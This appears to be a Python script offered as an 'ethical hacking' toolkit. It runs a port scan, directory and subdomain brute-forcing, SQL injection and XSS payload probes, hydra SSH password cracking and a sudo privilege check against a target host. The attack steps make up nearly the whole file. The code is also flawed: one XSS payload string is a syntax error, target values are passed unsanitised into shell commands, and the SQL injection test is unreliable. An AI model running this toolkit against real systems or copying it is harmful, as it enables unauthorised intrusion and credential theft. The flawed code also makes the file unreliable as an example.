import os
import sys
import socket
import subprocess
import requests
from bs4 import BeautifulSoup

class EthicalHackingToolkit:
    def __init__(self):
        self.target = None
        self.port = None
        self.wordlist = None
        self.username = None
        self.password = None

    def set_target(self, target):
        self.target = target

    def set_port(self, port):
        self.port = port

    def set_wordlist(self, wordlist):
        self.wordlist = wordlist

    def set_credentials(self, username, password):
        self.username = username
        self.password = password

    def port_scan(self):
        print("Scanning ports...")
        for port in range(1, 65535):
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            result = sock.connect_ex((self.target, port))
            if result == 0:
                print(f"Port {port} is open")
            sock.close()

    def directory_bruteforce(self):
        print("Bruteforcing directories...")
        with open(self.wordlist, 'r') as f:
            for line in f:
                url = f"http://{self.target}/{line.strip()}"
                response = requests.get(url)
                if response.status_code == 200:
                    print(f"Found directory: {url}")

    def subdomain_enum(self):
        print("Enumerating subdomains...")
        cmd = f"sublist3r -d {self.target}"
        output = subprocess.check_output(cmd, shell=True)
        print(output.decode())

    def web_app_scan(self):
        print("Scanning web application...")
        url = f"http://{self.target}"
        response = requests.get(url)
        soup = BeautifulSoup(response.text, 'html.parser')
        print(soup.prettify())

    def sql_injection(self):
        print("Testing for SQL injection...")
        url = f"http://{self.target}/?id=1"
        payloads = ["' OR 1=1--", "' OR '1'='1", "' OR ''='", "' OR 1=1#"]
        for payload in payloads:
            new_url = f"{url}{payload}"
            response = requests.get(new_url)
            if "error" not in response.text.lower():
                print(f"Possible SQL injection vulnerability found with payload: {payload}")

    def xss_scan(self):
        print("Scanning for XSS vulnerabilities...")
        url = f"http://{self.target}"
        payloads = ['<script>alert("XSS")</script>', '"><script>alert("XSS")</script>', "'><script>alert("XSS")</script>"]
        for payload in payloads:
            new_url = f"{url}?param={payload}"
            response = requests.get(new_url)
            if payload in response.text:
                print(f"Possible XSS vulnerability found with payload: {payload}")

    def password_cracking(self):
        print("Cracking passwords...")
        cmd = f"hydra -l {self.username} -P {self.wordlist} {self.target} ssh"
        output = subprocess.check_output(cmd, shell=True)
        print(output.decode())

    def privilege_escalation(self):
        print("Checking for privilege escalation...")
        cmd = f"sudo -l"
        output = subprocess.check_output(cmd, shell=True)
        print(output.decode())

    def run(self):
        self.port_scan()
        self.directory_bruteforce()
        self.subdomain_enum()
        self.web_app_scan()
        self.sql_injection()
        self.xss_scan()
        self.password_cracking()
        self.privilege_escalation()

if __name__ == "__main__":
    toolkit = EthicalHackingToolkit()
    toolkit.set_target("example.com")
    toolkit.set_port(80)
    toolkit.set_wordlist("wordlist.txt")
    toolkit.set_credentials("admin", "password")
    toolkit.run()